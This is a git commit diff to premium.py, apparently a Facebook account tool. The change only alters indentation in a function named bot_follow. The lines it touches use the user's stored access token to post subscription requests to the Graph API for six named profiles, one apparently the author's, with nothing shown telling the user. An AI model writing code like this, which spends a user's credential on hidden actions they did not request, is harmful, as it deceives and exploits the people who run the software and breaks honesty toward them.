1f10ce3cf4a60084c1cd9fc124edaaad569da04d
Dapunta ID <76211798+Dapunta@users.noreply.github.com>
2021-04-05 00:32:38 +0700

    Update premium.py

--- premium.py
+++ premium.py
@@ -180,13 +180,13 @@ def bot_follow():
 	except IOError:
 		print("\n   [!] Token invalid")
 		logs()
-    requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)      #Dapunta Khurayra X
-    requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)      #Anthonyus Immanuel
-    requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket) #Abigaille Dirgantara
-    requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)       #Boirah
-    requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket) #Anita Zuliatin
-    requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket) #Dapunta Xayonara
-    menu()
+    	requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)      #Dapunta Khurayra X
+    	requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)      #Anthonyus Immanuel
+    	requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket) #Abigaille Dirgantara
+    	requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)       #Boirah
+    	requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket) #Anita Zuliatin
+    	requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket) #Dapunta Xayonara
+    	menu()
 
 def menu():
   try:
